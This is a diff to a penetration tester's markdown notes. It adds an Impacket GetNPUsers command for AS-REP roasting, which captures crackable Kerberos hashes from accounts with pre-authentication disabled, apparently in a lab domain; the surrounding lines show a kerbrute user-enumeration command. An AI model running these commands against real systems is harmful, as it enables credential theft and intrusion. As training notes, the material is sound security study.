@@ -245,7 +245,9 @@ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
 ---
 
 ## 20. AS-REP Roasting
-
+```powershell
+python3 /home/sako/Tools/Impacket/examples/GetNPUsers.py cicada.vl/ -usersfile valid_users -format hashcat -outputfile hashes.txt
+```
 Reference: [Identify pre-auth-disabled users and capture hashes](https://github.com/Aghalarovf/Penetration-Tester/blob/main/Technical_Notes/Active_Directory/AD-Attacks/AS-REP_Roasting.md)
 
 ---
